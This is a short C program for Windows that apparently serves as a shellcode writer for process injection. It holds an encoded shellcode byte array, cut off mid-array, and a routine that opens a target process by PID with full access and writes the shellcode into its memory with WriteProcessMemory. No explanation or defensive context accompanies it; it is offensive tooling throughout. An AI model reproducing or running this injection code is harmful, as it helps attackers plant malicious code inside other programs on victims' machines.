#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] =
"\x4d\x31\xdb\x54\x5d\xdd\xc7\x66\x81\xe5\x10\xf9\x48\x0f"
"\xae\x45\x00\x41\xb3\x40\x49\xbd\x85\x0e\x3b\xfd\xdb\x1c"
"\xd7\x2f\x48\x8b\x55\x08\x49\xff\xcb\x4e\x31\x6c\xda\x2a"
"\xdf\x9f\x06\x43\x46\xbe\x0b\xae\xa8\x96\xd0\x62\x56\x51"
"\xfd\x82\x55\x10\xed\x75\xbb\x99\xab\x24\xc9\x9c\xd2"; /...

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: writer.exe <PID> <Address>\n");
        printf("Example: writer.exe 1234 0x000001A1B2C3D4E5\n");
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    LPVOID address;
    sscanf_s(argv[2], "%p", &address);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("Failed to open process! Error: %d\n", GetLastError());
        return 1;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, address, shellcode, sizeof(shellcode), &bytesWritten)) {
        printf("Failed to write shellcode! Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    printf("Successfully wrote %zu bytes to address 0x%p\n", bytesWritten, address);

    CloseHandle(hProcess);
    return 0;
}

